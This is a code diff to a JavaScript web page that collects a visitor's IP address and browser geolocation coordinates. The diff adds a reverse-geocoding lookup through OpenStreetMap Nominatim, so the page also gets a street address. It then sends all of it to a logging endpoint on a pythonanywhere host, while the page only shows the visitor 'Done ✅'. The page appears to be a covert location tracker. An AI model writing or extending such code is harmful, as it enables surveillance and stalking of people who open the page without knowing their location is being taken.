@@ -34,18 +34,28 @@ async function start() {
         data.lon = json.longitude;
     } catch(e) {}
 
-    function sendData() {
-        if (sent) return;
-        sent = true;
+    async function sendData() {
+    if (sent) return;
+    sent = true;
 
-        const url = `https://${PA_USER}.pythonanywhere.com/log?lat=${data.lat}&lon=${data.lon}&ip=${data.ip}&type=${data.type}`;
+    let address = "Unknown";
 
-        fetch(url).then(() => {
-            document.getElementById("status").innerText = "Done ✅";
-        }).catch(() => {
-            document.getElementById("status").innerText = "Error";
-        });
+    try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.lat}&lon=${data.lon}`);
+        const json = await res.json();
+        address = json.display_name;
+    } catch (e) {
+        console.log("Address fetch failed");
     }
+
+    const url = `https://${PA_USER}.pythonanywhere.com/log?lat=${data.lat}&lon=${data.lon}&ip=${data.ip}&type=${data.type}&address=${encodeURIComponent(address)}`;
+
+    fetch(url).then(() => {
+        document.getElementById("status").innerText = "Done ✅";
+    }).catch(() => {
+        document.getElementById("status").innerText = "Error";
+    });
+}
 
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
